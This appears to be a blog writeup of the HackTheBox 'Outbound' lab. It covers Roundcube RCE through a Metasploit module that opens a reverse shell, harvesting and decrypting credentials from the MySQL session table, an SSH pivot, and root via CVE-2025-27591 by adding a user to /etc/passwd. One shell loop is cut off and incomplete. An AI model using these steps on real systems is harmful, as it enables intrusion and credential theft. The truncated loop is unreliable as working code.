---
layout: post
title: Outbound
date: 2025-12-17 12:13 +0100
description: Exploiting a vulnerable web application to gain initial access and escalating privileges through a misconfigured sudo permission via CVE-2025-27591.
categories:
- Challenges
- HackTheBox
tags:
- hackthebox
- writeups
- linux
- easy
---

![Outbound HackTheBox Writeup](/assets/img/hackthebox/outbound/outbound.png){: width="80" height="80" .right }

## Reconnaissance

Initial host and service discovery to identify the attack surface.

```bash
sudo nmap -sS -sV -A <target_ip>
```

Common findings on this box: HTTP on port 80 and SSH on port 22.

## Initial Access (Roundcube RCE)

The site runs Roundcube webmail. Use the About page to confirm the version (e.g., 1.6.10). A public RCE exists for versions <= 1.5.9 and <= 1.6.10.

PoC: [CVE-2025-49113](https://github.com/00xCanelo/CVE-2025-49113)

I didn't achieve to exploit this vulnerability with this PoC.

So I decided to use metasploit to exploit this vulnerability.

```bash
msfconsole
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set RHOSTS http://<target_ip>
set PASSWORD <password>
set USERNAME <username>
set LHOST <your_ip>
shell
script /dev/null -c bash # To have a proper bash shell
```

> **Tyler** user is given in the description of the machine.
{: .prompt-info }

And we have a shell on the target machine as www-data user. Reuse the Roundcube credentials to switch to user `tyler`

```bash
su - tyler
```

## First Privilege Escalation

Run LinPEAS (or check manually). A local MySQL instance is configured for Roundcube and the DSN/credentials are in `config.inc.php`.

So we can connect to the mysql database with the following command:

```bash
mysql -u roundcube -p -h localhost -P 3306 roundcube
```

The `users` table stores password hashes, which may take time to crack. Instead, inspect the `session` table; data often appears base64â€‘encoded and may contain encrypted credentials.

```bash
mysql -u roundcube -p -h localhost -P 3306 -B -e "SELECT * FROM session" roundcube > sessions.tsv
tail -n +2 sessions.tsv | awk -F'\t' '{print $1 "\t" $4}' | while IFS=$'\t' read id data; do
```

And we find the hashed password of the jacob user. We can use a special github to decipher this hash because this use DES encryption and we have the key inside the config file `/var/www/html/roundcube/config/config.inc.php`.

I use this github: [Password Decrypt Rcube](https://github.com/rafelsusanto/rcube-password-decryptor)
And we got the jacob password. So we can connect to the round cube webmail as jacob user.

## Pivot via ssh

Inside the mail we find password for the jacob user that he had to change but he didn't.
So try to ssh as jacob user with this password. And we are able to connect via ssh as jacob user.

## Final Escalation of Privilege

Just use `sudo -l` to see the sudo rights of the jacob user. And we can see that jacob can execute `below` as root without password.
We can try to find a CVE to elevate our privilege via below. And we find CVE-2025-27591 that allows use to arbitrary file write via below.
So add a new root user in the `/etc/passwd` file with this following [github CVE-2025-27591](https://github.com/HOEUN-Visai/CVE-2025-27591-below-)

And we can become root via `su` with the password that we set in the `/etc/passwd` file.

## Takeaways

- Exploiting RCE in outdated RoundCube version to gain initial access.
- Extracting session data from MySQL database to retrieve user credentials.
- Leveraging misconfigured sudo permissions via CVE-2025-27591 to achieve root access.